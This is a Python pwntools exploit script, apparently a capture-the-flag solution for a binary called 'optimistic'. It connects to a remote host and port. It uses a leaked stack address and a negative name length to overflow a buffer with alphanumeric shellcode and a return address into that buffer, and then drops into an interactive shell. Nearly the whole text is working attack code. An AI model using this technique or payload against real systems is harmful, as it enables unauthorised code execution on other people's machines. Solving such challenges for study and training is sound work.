#!/usr/bin/env python3


from pwn import *

BINARY = "./optimistic"
ADDR = "138.68.148.149"
PORT = 32475

splash()
elf = context.binary = ELF(BINARY)

SHELLCODE = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    io.sendlineafter("Would you like to enroll yourself? (y/n): ", "y")
    io.recvuntil("Great! Here's a small welcome gift: ")
    stack_leak = int(io.recvuntil("\n")[:-1], 16)
    log.success(f"Got a stack leak: {hex(stack_leak)}")
    buffer_location = stack_leak - 0x60
    log.success(f"Found our buffer @: {hex(buffer_location)}")

    io.sendlineafter("Email: ", cyclic(0x7))
    io.sendlineafter("Age: ", cyclic(0x7))
    io.sendlineafter("Length of name: ", "-1")

    payload = [
        SHELLCODE,
        cyclic(104 - len(SHELLCODE), n=8),
        buffer_location,
    ]
    io.sendlineafter("Name: ", flat(payload))

    io.interactive()


if __name__ == "__main__":
    solve()
